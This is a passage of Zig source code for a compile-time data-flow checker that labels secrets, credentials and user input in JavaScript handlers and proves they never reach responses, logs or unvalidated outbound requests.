//! Compile-Time Data Flow Provenance Checker
//!
//! Tracks where data comes from (sources with labels) and where it goes
//! (sinks with policies), proving security properties at compile time:
//!   - Secrets (env vars with sensitive names) never reach response bodies
//!   - Credentials (auth tokens, JWTs) never appear in logs
//!   - User input is validated before use in external egress
//!
//! This is possible because zttp's JS subset has no eval, no exceptions,
//! no dynamic property access beyond known patterns, and virtual modules are
//! the ONLY I/O boundary. The IR tree IS the control flow graph. Data flow
//! analysis is a simple recursive tree walk, not an expensive fixpoint.
//!
//! Labels are auto-derived from ModuleBinding.return_labels and refined by
//! env var naming conventions. No user annotations required for basic proofs.

const std = @import("std");
const stripper = @import("zts-engine").stripper;
const source_frontend = @import("zts-engine").source_frontend;
const ir = @import("zts-engine").parser.ir;
const object = @import("zts-engine").object;
const atom_table = @import("zts-engine").atom_table;
const builtin_modules = @import("zts-engine").builtin_modules;
const module_facts_mod = @import("module_facts.zig");
const mb = @import("zts-engine").module_binding;
const bool_checker_mod = @import("bool_checker.zig");
const known_globals = @import("zts-base").known_globals;
const counterexample = @import("counterexample.zig");
const repair_intent_mod = @import("repair_intent.zig");

pub const RepairIntent = repair_intent_mod.RepairIntent;

const Node = ir.Node;
const NodeIndex = ir.NodeIndex;
const NodeTag = ir.NodeTag;
const IrView = ir.IrView;
const null_node = ir.null_node;
const LabelSet = mb.LabelSet;
const DataLabel = mb.DataLabel;

const packBindingKey = bool_checker_mod.packBindingKey;

// ---------------------------------------------------------------------------
// Diagnostic types
// ---------------------------------------------------------------------------

pub const Severity = enum {
    err,
    warning,

    pub fn label(self: Severity) []const u8 {
        return switch (self) {
            .err => "error",
            .warning => "warning",
        };
    }
};

pub const DiagnosticKind = enum {
    secret_in_response, // {secret} data in Response body/headers
    credential_in_response, // {credential} data in Response body
    secret_in_log, // {secret} data in console.log/warn/error
    credential_in_log, // {credential} data in console.log/warn/error
    secret_in_egress_url, // {secret} data in fetchSync URL
    credential_in_egress_url, // {credential} data in fetchSync URL
    secret_in_egress_body, // {secret} data in fetchSync body
    unvalidated_input_in_egress, // {user_input} without {validated} in fetchSync
};

/// Snapshot of the branch constraints and module calls observed on the
/// path that witnessed a flow sink. Present on diagnostics whose kind
/// maps to a `counterexample.PropertyTag`; the solver turns it into an
/// executable request + stub sequence. Owned by the FlowChecker
/// allocator; freed in `FlowChecker.deinit`.
pub const Witness = struct {
    path_constraints: []const counterexample.WitnessConstraint,
    io_calls: []const counterexample.TrackedIoCall,
};

pub const Diagnostic = struct {
    severity: Severity,
    kind: DiagnosticKind,
    node: NodeIndex,
    message: []const u8,
    help: ?[]const u8,
    witness: ?Witness = null,
    /// Typed repair primitive the agent uses to pick an apply step directly.
    ///
    /// Always null here, and a test over the kind set holds it that way. Every
    /// flow diagnostic reports a labelled value reaching a sink; the label is
    /// what fails the proof, and no conditional removes a label. The checker
    /// used to offer `insert_guard_before_line` on all of them, which sent an
    /// agent looking for a guard that could not exist.
    repair_intent: ?RepairIntent = null,
};

/// How a flow property was *held* (proven safe), captured for the green-proof
/// card. The passing-case sibling of `Witness`: where `Witness` records the
/// path that breaks a property, a `DefendedPath` records why the property
/// could not be broken. Two shapes:
///   - `.validated`: a tainted value reached a sink but carried `.validated`,
///     i.e. it passed a named validator first. `guard_func` is the validator.
///   - `.never_reached`: a tainted value was read but reached no sink at all.
///     No guard is named (none exists); the value is simply contained.
///
/// Soundness: a `.validated` path is emitted ONLY when the specific validator
/// binding is recovered from the sink expression's `result.value` provenance.
/// If the guard cannot be named, no path is recorded - the property still
/// proves true, it just carries no resisted card. The evidence is always
/// derived from what the prover observed, never fabricated.
pub const SafeForm = enum { validated, never_reached };

pub const DefendedPath = struct {
    property: counterexample.PropertyTag,
    safe_form: SafeForm,
    /// Validator function name, present iff `safe_form == .validated`.
    /// Borrowed from `module_fn_meta` (checker-lifetime); never freed here.
    guard_func: ?[]const u8 = null,
    guard_line: u32 = 0,
    /// Human label of the sink the validated value safely reached
    /// (static literal); "" for `.never_reached`.
    sink_label: []const u8 = "",
    sink_line: u32 = 0,
};

/// The validator call that produced a `.validated` binding, recorded so a
/// defended path can name the guard. `node` resolves to the call's source loc.
const GuardInfo = struct {
    func: []const u8,
    node: NodeIndex,
};

/// Map a diagnostic kind to the property tag it witnesses. `null` when the
/// diagnostic does not correspond to a currently modelled property (the
/// counterexample surface is a subset of flow diagnostics by design).
pub fn propertyTagForKind(kind: DiagnosticKind) ?counterexample.PropertyTag {
    return switch (kind) {
        .secret_in_response,
        .secret_in_log,
        .secret_in_egress_url,
        .secret_in_egress_body,
        => .no_secret_leakage,
        .credential_in_response,
        .credential_in_log,
        .credential_in_egress_url,
        => .no_credential_leakage,
        .unvalidated_input_in_egress => .injection_safe,
    };
}

/// Proven data flow properties for a handler.
pub const FlowProperties = struct {
    /// No {secret} data reaches response bodies, headers, or external egress.
    no_secret_leakage: bool = true,
    /// No {credential} data reaches response bodies or logs.
    no_credential_leakage: bool = true,
    /// All {user_input} data passes through validation before external egress.
    input_validated: bool = true,
    /// {user_input} data does not flow to external egress hosts.
    pii_contained: bool = true,
    /// No unvalidated user input reaches sensitive sinks (egress, HTML responses).
    injection_safe: bool = true,
    /// No clock- or RNG-derived value reaches the response.
    ///
    /// Only ever falsified here. The capability rule in effect inference is the
    /// other source - it sees `Date.now()`, which is a global member call and
    /// never a labelled module import - so the two are ANDed rather than one
    /// replacing the other.
    deterministic: bool = true,
};

// ---------------------------------------------------------------------------
// External data labels
// ---------------------------------------------------------------------------

/// An externally declared label binding: a field name, its classification,
/// and a human-readable reason shown in diagnostics.
pub const ExternalLabel = struct {
    field: []const u8, // e.g. "User.email" or just "email"
    label: DataLabel,
    reason: []const u8,
};

/// Map a JSON label string to the corresponding DataLabel enum value.
/// Returns null for unrecognized strings.
pub fn parseDataLabel(s: []const u8) ?DataLabel {
    const map = .{
        .{ "secret", DataLabel.secret },
        .{ "credential", DataLabel.credential },
        .{ "user_input", DataLabel.user_input },
        .{ "config", DataLabel.config },
        .{ "internal", DataLabel.internal },
        .{ "external", DataLabel.external },
        .{ "validated", DataLabel.validated },
        .{ "nondeterministic", DataLabel.nondeterministic },
    };
    inline for (map) |entry| {
        if (std.mem.eql(u8, s, entry[0])) return entry[1];
    }
    return null;
}

/// Parse external label declarations from JSON bytes.
/// Expected format: { "labels": [ { "field": "...", "label": "...", "reason": "..." }, ... ] }
/// Returns owned slice; caller must free with the same allocator.
pub fn parseExternalLabels(allocator: std.mem.Allocator, json_bytes: []const u8) ![]const ExternalLabel {
    var parsed = try std.json.parseFromSlice(std.json.Value, allocator, json_bytes, .{});
    defer parsed.deinit();

    if (parsed.value != .object) return error.InvalidExternalLabels;
    const root = parsed.value.object;
    const labels_val = root.get("labels") orelse return error.InvalidExternalLabels;
    if (labels_val != .array) return error.InvalidExternalLabels;

    const items = labels_val.array.items;
    var result = try allocator.alloc(ExternalLabel, items.len);
    var count: usize = 0;
    errdefer {
        for (result[0..count]) |entry| {
            allocator.free(entry.field);
            allocator.free(entry.reason);
        }
        allocator.free(result);
    }

    for (items) |item| {
        if (item != .object) continue;
        const obj = item.object;

        const field_val = obj.get("field") orelse continue;
        const label_val = obj.get("label") orelse continue;
        const reason_val = obj.get("reason") orelse continue;

        if (field_val != .string or label_val != .string or reason_val != .string) continue;

        const data_label = parseDataLabel(label_val.string) orelse continue;

        // Dupe strings so they outlive the parsed JSON tree
        const field_dupe = try allocator.dupe(u8, field_val.string);
        errdefer allocator.free(field_dupe);
        const reason_dupe = try allocator.dupe(u8, reason_val.string);

        result[count] = .{
            .field = field_dupe,
            .label = data_label,
            .reason = reason_dupe,
        };
        count += 1;
    }

    // Shrink to actual count
    if (count < result.len) {
        result = try allocator.realloc(result, count);
    }
    return result;
}

// ---------------------------------------------------------------------------
// FlowChecker
// ---------------------------------------------------------------------------

/// Caps for callee return-label summaries and return-value resolution. Beyond
/// these the checker falls back to the conservative direction: the call's value
/// carries `.unknown`, so a sink it reaches clears what it governs instead of
/// proving it. The caps therefore cost precision, never soundness. The summary
/// is not memoized, so a call site re-walks the callee body, and the depth is
/// what bounds that work.
const max_summary_params = 8;
const max_summary_depth = 8;
const response_resolve_limit = 16;

pub const FlowChecker = struct {
    allocator: std.mem.Allocator,
    ir_view: IrView,
    atoms: ?*atom_table.AtomTable,
    diagnostics: std.ArrayList(Diagnostic),

    /// Per-binding labels: packed(scope_id, slot) -> LabelSet.
    binding_labels: std.AutoHashMapUnmanaged(u32, LabelSet),
    /// Virtual module import tracking: local slot -> FunctionBinding return_labels.
    module_fn_labels: std.AutoHashMapUnmanaged(u16, LabelSet),
    /// Virtual module function metadata (module name, function name, return kind),
    /// keyed by the same slot as `module_fn_labels`. Populated by `scanImports`
    /// and consumed by the counterexample-witness capture pipeline.
    module_fn_meta: std.AutoHashMapUnmanaged(u16, counterexample.StubInfo),
    /// Slots of imported exports that declare `derives_from_args`: their result
    /// can contain what an argument carried, so the call's labels are the union
    /// of the arguments' rather than the declared set alone.
    module_fn_arg_derived: std.AutoHashMapUnmanaged(u16, void),
    /// Return labels for functions imported from another file, local slot ->
    /// labels. The checker has no file access, so the caller computes these
    /// with `exportedReturnLabels` over the imported module and installs them
    /// before `check`. Without them a cross-file call is untraceable and costs
    /// every property its value's sink decides.
    file_fn_labels: std.AutoHashMapUnmanaged(u16, LabelSet),
    /// Per-binding origin: packed(scope_id, slot) -> metadata for the module
    /// call that initialised this binding. Lets the constraint extractor emit
    /// per-call stub constraints on `if (binding)` patterns.
    binding_origin: std.AutoHashMapUnmanaged(u32, counterexample.StubInfo),
    /// Result binding tracking: packed(scope_id, slot) -> return_labels from the producing call.
    /// When accessing .value on these bindings, the return_labels are merged in.
    result_binding_labels: std.AutoHashMapUnmanaged(u32, LabelSet),
    /// Defining value nodes per binding: packed(scope_id, slot) -> every init
    /// and assignment value recorded during the walk. Lets the response-sink
    /// check resolve a returned identifier back to the Response call(s) that
    /// produced it; without this, `const r = Response.html(x); return r;`
    /// skips the sink analysis entirely.
    binding_value_nodes: std.AutoHashMapUnmanaged(u32, std.ArrayListUnmanaged(NodeIndex)),
    /// User function declarations: packed binding key -> function expression
    /// node. Feeds callee return-label summaries in `userCallLabels`.
    user_fn_decls: std.AutoHashMapUnmanaged(u32, NodeIndex),
    /// When non-null, the walk is summarizing a callee body: return statements
    /// merge their labels here instead of running sink checks, and expression
    /// sinks stay silent (diagnostics belong to the handler walk).
    summary_returns: ?*LabelSet,
    /// Callee summaries in progress (recursion guard).
    summary_stack: [max_summary_depth]u32,
    summary_depth: u8,
    /// Guard provenance for validated bindings: packed(scope_id, slot) -> the
    /// validator call that set the `.validated` label. Lets a defended path
    /// name the guard ("validated by schemaCompile()"). Populated alongside
    /// `result_binding_labels` in `trackResultBinding`.
    result_binding_guard: std.AutoHashMapUnmanaged(u32, GuardInfo),
    /// Passing-case evidence: why each held flow property could not be broken.
    /// The green-proof sibling of `diagnostics`. Strings are borrowed
    /// (checker-lifetime / static); only the list backing is freed.
    defended_paths: std.ArrayListUnmanaged(DefendedPath),
    /// Handler request parameter binding key (packed scope_id + slot).
    req_binding_key: ?u32,
    /// Slot of the `env` function import (for smart label refinement).
    env_fn_slot: ?u16,
    /// Shared import index, injected by the orchestrator when one exists.
    /// Borrowed; must outlive the checker. Null means build a private one.
    facts: ?*const module_facts_mod.ModuleFacts = null,
    owned_facts: ?module_facts_mod.ModuleFacts = null,
    /// Constraint stack maintained as `walkStmt` descends into conditional
    /// branches. Snapshotted onto every diagnostic at emission time.
    working_constraints: std.ArrayListUnmanaged(counterexample.WitnessConstraint),
    /// Ordered list of virtual-module calls observed by the current walk.
    /// Snapshotted alongside `working_constraints` on diagnostics.
    working_io_calls: std.ArrayListUnmanaged(counterexample.TrackedIoCall),

    /// External label overrides: property name -> LabelSet (additive, merged via OR).
    /// Both qualified ("User.email") and short ("email") forms are registered.
    external_labels: std.StringHashMapUnmanaged(LabelSet),
    /// External label reasons: property name -> human-readable reason for diagnostics.
    external_reasons: std.StringHashMapUnmanaged([]const u8),
    /// Dynamically formatted diagnostic messages that need freeing.
    allocated_messages: std.ArrayListUnmanaged([]const u8),

    properties: FlowProperties,
    /// Sticky failure for taint labels, provenance, defended paths,
    /// constraints, witnesses, and diagnostics. Human-only reason/message
    /// enrichment may fall back to its base text without weakening a proof.
    allocation_failed: bool = false,

    pub fn init(allocator: std.mem.Allocator, ir_view: IrView, atoms: ?*atom_table.AtomTable) FlowChecker {
        return .{
            .allocator = allocator,
            .ir_view = ir_view,
            .atoms = atoms,
            .diagnostics = .empty,
            .binding_labels = .empty,
            .module_fn_labels = .empty,
            .module_fn_meta = .empty,
            .module_fn_arg_derived = .empty,
            .file_fn_labels = .empty,
            .binding_origin = .empty,
            .result_binding_labels = .empty,
            .result_binding_guard = .empty,
            .binding_value_nodes = .empty,
            .user_fn_decls = .empty,
            .summary_returns = null,
            .summary_stack = @splat(0),
            .summary_depth = 0,
            .defended_paths = .empty,
            .req_binding_key = null,
            .env_fn_slot = null,
            .working_constraints = .empty,
            .working_io_calls = .empty,
            .external_labels = .empty,
            .external_reasons = .empty,
            .allocated_messages = .empty,
            .properties = .{},
            .allocation_failed = false,
        };
    }

    pub fn deinit(self: *FlowChecker) void {
        for (self.diagnostics.items) |d| {
            if (d.witness) |w| {
                if (w.path_constraints.len > 0) self.allocator.free(w.path_constraints);
                if (w.io_calls.len > 0) self.allocator.free(w.io_calls);
            }
        }
        self.diagnostics.deinit(self.allocator);
        self.binding_labels.deinit(self.allocator);
        if (self.owned_facts) |*owned| owned.deinit();
        self.module_fn_labels.deinit(self.allocator);
        self.module_fn_meta.deinit(self.allocator);
        self.module_fn_arg_derived.deinit(self.allocator);
        self.file_fn_labels.deinit(self.allocator);
        self.binding_origin.deinit(self.allocator);
        self.working_constraints.deinit(self.allocator);
        self.working_io_calls.deinit(self.allocator);
        self.result_binding_labels.deinit(self.allocator);
        self.result_binding_guard.deinit(self.allocator);
        self.defended_paths.deinit(self.allocator);
        var value_node_iter = self.binding_value_nodes.valueIterator();
        while (value_node_iter.next()) |list| {
            list.deinit(self.allocator);
        }
        self.binding_value_nodes.deinit(self.allocator);
        self.user_fn_decls.deinit(self.allocator);

        // Free dynamically formatted diagnostic messages
        for (self.allocated_messages.items) |msg| {
            self.allocator.free(msg);
        }
        self.allocated_messages.deinit(self.allocator);

        // Free duped key strings and reason strings from external labels
        var label_iter = self.external_labels.iterator();
        while (label_iter.next()) |entry| {
            self.allocator.free(entry.key_ptr.*);
        }
        self.external_labels.deinit(self.allocator);

        var reason_iter = self.external_reasons.iterator();
        while (reason_iter.next()) |entry| {
            self.allocator.free(entry.key_ptr.*);
            self.allocator.free(entry.value_ptr.*);
        }
        self.external_reasons.deinit(self.allocator);
    }

    /// Run the flow analysis on the given handler function node.
    /// Returns the number of errors found.
    pub fn check(self: *FlowChecker, handler_func: NodeIndex) !u32 {
        self.scanImports();
        self.scanFunctionDecls();
        self.findHandlerParam(handler_func);
        self.walkStmt(handler_func);
        self.recordContainedSecrets();
        if (self.allocation_failed) return error.OutOfMemory;

        var error_count: u32 = 0;
        for (self.diagnostics.items) |diag| {
            if (diag.severity == .err) error_count += 1;
        }
        return error_count;
    }

    /// Labels a module call inherits from closures passed to it. A module
    /// export answers with its declared return labels, which describe what the
    /// module itself produces and cannot describe what a caller's callback
    /// returns: `parallel([() => env("SECRET_KEY")])` declares `external` and
    /// the secret vanished.
    ///
    /// Only closures contribute. Unioning every argument would taint results
    /// that carry no argument data - `cacheSet("ns", key, userInput)` answers a
    /// boolean, not the user's data - and the pass-through shape that needs
    /// this is always a callback the module invokes: `parallel`, `race`,
    /// `step`, `call`, `saga`, `using`.
    ///
    /// `nondeterministic` is dropped for a durable export, and only that label:
    /// the callback's value is recorded on the first run and replayed after, so
    /// it is the same on every run, while a secret it returns is still a secret
    /// in the response.
    fn closureArgLabels(self: *FlowChecker, slot: u16, call_data: Node.CallExpr) LabelSet {
        const is_durable = if (self.module_fn_meta.get(slot)) |meta|
            std.mem.eql(u8, meta.module, "durable")
        else
            false;

        var labels = LabelSet.empty;
        for (0..call_data.args_count) |i| {
            const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));

            // Whether a closure is present is a question about the argument's
            // shape, not about the labels it produced: `() => Date.now()` under
            // a durable export produces exactly one label and then loses it, so
            // an emptiness test would read it as "no closure here" and fall to
            // the eager branch that puts the label back.
            if (self.closuresWithin(arg)) |from_closure| {
                var l = from_closure;
                if (is_durable) l.nondeterministic = false;
                labels = LabelSet.merge(labels, l);
            } else if (is_durable) {
                // Only what a closure returns is replayed. `step("ts",
                // Date.now())` reads the clock before `step` is ever called, so
                // no replay reproduces that value and the eager form keeps the
                // label the callback form loses.
                labels = LabelSet.merge(labels, self.inferLabels(arg));
            }
        }
        return labels;
    }

    /// Union of what every closure inside `node` produces, or null when `node`
    /// holds no closure at all. Null and the empty set are different answers: a
    /// callback that returns nothing labelled still went through a call the
    /// module makes, and a durable export replays only what such a call
    /// returned. Testing emptiness instead would read `() => Date.now()` under
    /// `step` - one label, then dropped as replayed - as "no closure here".
    ///
    /// Descends through the array and object literals a callback is usually
    /// wrapped in, and ignores every other value.
    fn closuresWithin(self: *FlowChecker, node: NodeIndex) ?LabelSet {
        if (node == null_node) return null;
        const tag = self.ir_view.getTag(node) orelse return null;
        switch (tag) {
            .arrow_function, .function_expr => return self.closureResultLabels(node),
            .array_literal => {
                const arr = self.ir_view.getArray(node) orelse return null;
                var labels: ?LabelSet = null;
                var i: u16 = 0;
                while (i < arr.elements_count) : (i += 1) {
                    const elem = self.ir_view.getListIndex(arr.elements_start, i);
                    if (self.closuresWithin(elem)) |found| {
                        labels = LabelSet.merge(labels orelse LabelSet.empty, found);
                    }
                }
                return labels;
            },
            .object_literal => {
                const obj = self.ir_view.getObject(node) orelse return null;
                var labels: ?LabelSet = null;
                var i: u16 = 0;
                while (i < obj.properties_count) : (i += 1) {
                    const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
                    if ((self.ir_view.getTag(prop_idx) orelse continue) != .object_property) continue;
                    const prop = self.ir_view.getProperty(prop_idx) orelse continue;
                    if (self.closuresWithin(prop.value)) |found| {
                        labels = LabelSet.merge(labels orelse LabelSet.empty, found);
                    }
                }
                return labels;
            },
            // A closure bound to a name and passed by that name. Resolved
            // through the same declaration index the user-call summary uses,
            // because the identifier's own labels are not consulted here - only
            // closures contribute, and answering `inferLabels` for every
            // identifier would taint results that carry no argument data.
            .identifier => {
                const binding = self.ir_view.getBinding(node) orelse return null;
                const key = packBindingKey(binding.scope_id, binding.slot);
                const fn_node = self.user_fn_decls.get(key) orelse return null;
                return self.closureResultLabels(fn_node);
            },

            // exhaustive: this function looks for closures a module will call,
            // and the arms above are the shapes one arrives in - bare, in an
            // array, as an object field, or under a name. No other tag can hold
            // a closure the callee invokes without going through one of them.
            // Null owes nothing here: it reports that the argument is a plain
            // value, which is what tells the two durable forms apart.
            else => return null,
        }
    }

    /// Labels of the value a closure produces when called. Parameters are left
    /// as they are: a caller that passes a labelled argument unions it in
    /// separately, and a higher-order function supplying the argument itself
    /// (the element in `map`) contributes the receiver's labels through the
    /// same union. Recursion is bounded by the same summary stack the
    /// user-function path uses.
    fn closureResultLabels(self: *FlowChecker, node: NodeIndex) LabelSet {
        const func = self.ir_view.getFunction(node) orelse return .{ .unknown = true };
        if (self.summary_depth >= max_summary_depth) return .{ .unknown = true };
        for (self.summary_stack[0..self.summary_depth]) |active| {
            if (active == node) return LabelSet.empty;
        }

        self.summary_stack[self.summary_depth] = node;
        self.summary_depth += 1;
        defer self.summary_depth -= 1;

        const body_tag = self.ir_view.getTag(func.body) orelse return .{ .unknown = true };
        if (body_tag == .block or body_tag == .program or body_tag == .return_stmt) {
            var collected = LabelSet.empty;
            const saved = self.summary_returns;
            self.summary_returns = &collected;
            defer self.summary_returns = saved;
            self.walkStmt(func.body);
            return collected;
        }
        return self.inferLabels(func.body);
    }

    /// Record the return labels of a function imported from another file,
    /// keyed by the local binding slot the import produced. Call before
    /// `check`; the labels come from `exportedReturnLabels` run over that file.
    pub fn setFileFunctionLabels(self: *FlowChecker, slot: u16, labels: LabelSet) void {
        self.file_fn_labels.put(self.allocator, slot, labels) catch self.markAllocationFailure();
    }

    /// Return labels of the exported function named `name`, for a caller in
    /// another module. Parameters are left unlabelled: the caller unions this
    /// with its own argument labels, and a label reaching the return came
    /// either from an argument, which that union covers, or from the body,
    /// which this covers. Null when the module exports no such function.
    ///
    /// Only the named function's body is walked. Its own calls into modules
    /// this checker cannot resolve stay `unknown`, so the answer never claims
    /// more than one file's worth of evidence.
    pub fn exportedReturnLabels(self: *FlowChecker, name: []const u8) ?LabelSet {
        self.scanImports();
        self.scanFunctionDecls();

        const fn_node = self.findFunctionByName(name) orelse return null;
        const func = self.ir_view.getFunction(fn_node) orelse return null;

        var collected = LabelSet.empty;
        const body_tag = self.ir_view.getTag(func.body) orelse return null;
        if (body_tag == .block or body_tag == .program or body_tag == .return_stmt) {
            const saved = self.summary_returns;
            self.summary_returns = &collected;
            defer self.summary_returns = saved;
            self.walkStmt(func.body);
            return collected;
        }
        return self.inferLabels(func.body);
    }

    /// The function declaration bound to `name` at module scope, or null.
    fn findFunctionByName(self: *const FlowChecker, name: []const u8) ?NodeIndex {
        const node_count = self.ir_view.nodeCount();
        for (0..node_count) |idx_usize| {
            const idx: NodeIndex = @intCast(idx_usize);
            const tag = self.ir_view.getTag(idx) orelse continue;
            if (tag != .function_decl and tag != .var_decl) continue;
            const vd = self.ir_view.getVarDecl(idx) orelse continue;
            if (vd.init == null_node) continue;
            if (tag == .var_decl) {
                const init_tag = self.ir_view.getTag(vd.init) orelse continue;
                if (init_tag != .function_expr and init_tag != .arrow_function) continue;
            }
            const decl_name = self.resolveAtomName(vd.binding.name_atom) orelse continue;
            if (std.mem.eql(u8, decl_name, name)) return vd.init;
        }
        return null;
    }

    /// After the walk, record `.never_reached` defended paths for the leak
    /// families: a secret/credential binding was read but no sink consumed it.
    /// Only fires when such a binding exists, so handlers that touch no secrets
    /// carry no spurious card. The user_input family is intentionally excluded
    /// here - the request parameter always carries `.user_input`, so a
    /// never-reached scan on it would fire on every handler.
    fn recordContainedSecrets(self: *FlowChecker) void {
        const Pair = struct { tag: counterexample.PropertyTag, label: DataLabel, held: bool };
        const pairs = [_]Pair{
            .{ .tag = .no_secret_leakage, .label = .secret, .held = self.properties.no_secret_leakage },
            .{ .tag = .no_credential_leakage, .label = .credential, .held = self.properties.no_credential_leakage },
        };
        for (pairs) |p| {
            if (!p.held) continue;
            if (self.hasDefendedPath(p.tag)) continue;
            if (!self.anyBindingHasLabel(p.label)) continue;
            self.defended_paths.append(self.allocator, .{
                .property = p.tag,
                .safe_form = .never_reached,
            }) catch self.markAllocationFailure();
        }
    }

    fn anyBindingHasLabel(self: *const FlowChecker, label: DataLabel) bool {
        var it = self.binding_labels.valueIterator();
        while (it.next()) |ls| {
            if (ls.has(label)) return true;
        }
        return false;
    }

    fn hasDefendedPath(self: *const FlowChecker, tag: counterexample.PropertyTag) bool {
        for (self.defended_paths.items) |d| {
            if (d.property == tag) return true;
        }
        return false;
    }

    /// Record a `.validated` defended path for `tag` if its guard can be named
    /// from the sink value's `result.value` provenance. No guard found -> no
    /// path (the property still holds; it just carries no resisted card).
    fn recordValidated(
        self: *FlowChecker,
        tag: counterexample.PropertyTag,
        value_expr: NodeIndex,
        sink_node: NodeIndex,
        sink_label: []const u8,
    ) void {
        if (self.hasDefendedPath(tag)) return;
        const guard = self.findGuardInExpr(value_expr) orelse return;
        const guard_loc = self.ir_view.getLoc(guard.node);
        const sink_loc = self.ir_view.getLoc(sink_node);
        self.defended_paths.append(self.allocator, .{
            .property = tag,
            .safe_form = .validated,
            .guard_func = guard.func,
            .guard_line = if (guard_loc) |l| l.line else 0,
            .sink_label = sink_label,
            .sink_line = if (sink_loc) |l| l.line else 0,
        }) catch self.markAllocationFailure();
    }

    /// Walk an expression for the validator that cleared the taint: the first
    /// `<ident>.value` whose binding is a tracked validation result, or a bare
    /// identifier that is itself such a binding. Mirrors `inferLabels`'
    /// recursion over the shapes that can carry a `.validated` label.
    fn findGuardInExpr(self: *const FlowChecker, node: NodeIndex) ?GuardInfo {
        if (node == null_node) return null;
        const tag = self.ir_view.getTag(node) orelse return null;
        switch (tag) {
            .identifier => {
                const binding = self.ir_view.getBinding(node) orelse return null;
                const key = packBindingKey(binding.scope_id, binding.slot);
                return self.result_binding_guard.get(key);
            },
            .member_access, .optional_chain => {
                const member = self.ir_view.getMember(node) orelse return null;
                // `result.value` is the canonical validated-value access.
                if (self.resolveAtomName(member.property)) |prop_name| {
                    if (std.mem.eql(u8, prop_name, "value")) {
                        const obj_tag = self.ir_view.getTag(member.object) orelse return null;
                        if (obj_tag == .identifier) {
                            const binding = self.ir_view.getBinding(member.object) orelse return null;
                            const key = packBindingKey(binding.scope_id, binding.slot);
                            if (self.result_binding_guard.get(key)) |g| return g;
                        }
                    }
                }
                return self.findGuardInExpr(member.object);
            },
            .binary_op => {
                const bin = self.ir_view.getBinary(node) orelse return null;
                return self.findGuardInExpr(bin.left) orelse self.findGuardInExpr(bin.right);
            },
            .ternary => {
                const t = self.ir_view.getTernary(node) orelse return null;
                return self.findGuardInExpr(t.then_branch) orelse self.findGuardInExpr(t.else_branch);
            },
            .object_literal => {
                const obj = self.ir_view.getObject(node) orelse return null;
                var i: u16 = 0;
                while (i < obj.properties_count) : (i += 1) {
                    const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
                    const prop_tag = self.ir_view.getTag(prop_idx) orelse continue;
                    if (prop_tag == .object_property) {
                        const prop = self.ir_view.getProperty(prop_idx) orelse continue;
                        if (self.findGuardInExpr(prop.value)) |g| return g;
                    } else if (prop_tag == .object_spread) {
                        if (self.ir_view.getOptValue(prop_idx)) |val| {
                            if (self.findGuardInExpr(val)) |g| return g;
                        }
                    }
                }
                return null;
            },
            .array_literal => {
                const arr = self.ir_view.getArray(node) orelse return null;
                var i: u16 = 0;
                while (i < arr.elements_count) : (i += 1) {
                    const elem_idx = self.ir_view.getListIndex(arr.elements_start, i);
                    if (self.findGuardInExpr(elem_idx)) |g| return g;
                }
                return null;
            },
            .spread, .unary_op => {
                if (self.ir_view.getOptValue(node)) |operand| return self.findGuardInExpr(operand);
                return null;
            },
            .assignment => {
                const asgn = self.ir_view.getAssignment(node) orelse return null;
                return self.findGuardInExpr(asgn.value);
            },
            .computed_access => {
                const member = self.ir_view.getMember(node) orelse return null;
                return self.findGuardInExpr(member.object);
            },
            // exhaustive: null means "no guard found here", which leaves the
            // value treated as unguarded. A missed guard adds diagnostics; it
            // cannot remove one.
            else => return null,
        }
    }

    pub fn getDiagnostics(self: *const FlowChecker) []const Diagnostic {
        return self.diagnostics.items;
    }

    /// Passing-case evidence: defended paths for held flow properties.
    pub fn getDefendedPaths(self: *const FlowChecker) []const DefendedPath {
        return self.defended_paths.items;
    }

    pub fn getProperties(self: *const FlowChecker) FlowProperties {
        return self.properties;
    }

    /// Populate external label maps from parsed ExternalLabel declarations.
    /// For qualified field names like "User.email", both the full name and the
    /// short form ("email") are registered. Labels are additive: if multiple
    /// declarations target the same field, their LabelSets are merged via OR.
    pub fn setExternalLabels(self: *FlowChecker, labels: []const ExternalLabel) void {
        for (labels) |ext| {
            self.registerExternalField(ext.field, ext.label, ext.reason);

            // Also register short form: everything after the last dot
            if (std.mem.lastIndexOfScalar(u8, ext.field, '.')) |dot_pos| {
                const short = ext.field[dot_pos + 1 ..];
                if (short.len > 0) {
                    self.registerExternalField(short, ext.label, ext.reason);
                }
            }
        }
    }

    fn registerExternalField(self: *FlowChecker, name: []const u8, label: DataLabel, reason: []const u8) void {
        const label_set = LabelSet.fromLabel(label);

        if (self.external_labels.getEntry(name)) |entry| {
            // Merge into existing entry - no new key allocation needed
            entry.value_ptr.* = LabelSet.merge(entry.value_ptr.*, label_set);
        } else {
            const duped_key = self.allocator.dupe(u8, name) catch {
                self.markAllocationFailure();
                return;
            };
            self.external_labels.put(self.allocator, duped_key, label_set) catch {
                self.allocator.free(duped_key);
                self.markAllocationFailure();
                return;
            };
        }

        if (self.external_reasons.get(name) == null) {
            const reason_key = self.allocator.dupe(u8, name) catch return;
            const reason_val = self.allocator.dupe(u8, reason) catch {
                self.allocator.free(reason_key);
                return;
            };
            self.external_reasons.put(self.allocator, reason_key, reason_val) catch {
                self.allocator.free(reason_key);
                self.allocator.free(reason_val);
            };
        }
    }

    pub fn formatDiagnostics(self: *const FlowChecker, source: stripper.SourceView, writer: anytype) !void {
        for (self.diagnostics.items) |diag| {
            const loc = self.ir_view.getLoc(diag.node) orelse continue;
            try writer.print("{s}: {s}\n", .{ diag.severity.label(), diag.message });
            try source.writeLocation(loc.line, loc.column, writer);
            if (diag.help) |help| try writer.print("   = help: {s}\n", .{help});
            try writer.writeByte('\n');
        }
    }

    /// Resolve the index to read: injected, or private on first use.
    fn resolveFacts(self: *FlowChecker) ?*const module_facts_mod.ModuleFacts {
        if (self.facts) |f| return f;
        if (self.owned_facts == null) {
            self.owned_facts = module_facts_mod.ModuleFacts.build(
                self.allocator,
                self.ir_view,
                self.atoms,
                null,
            ) catch {
                self.markAllocationFailure();
                return null;
            };
        }
        return &self.owned_facts.?;
    }

    /// Populate the three slot-keyed collections and the env slot.
    ///
    /// `.builtin` only, translating the legacy `fromSpecifier(module) == null`
    /// skip: that lookup never consults a manifest registry, so a
    /// partner-registered module was skipped before and stays skipped.
    /// True when calling this export can return a different value in a later
    /// run of the same request.
    ///
    /// Two sources, and both are needed. The capability set catches a clock
    /// read or a draw of randomness; it falls back to the module's declared set
    /// when the export declares none, which is the same inheritance rule effect
    /// inference applies.
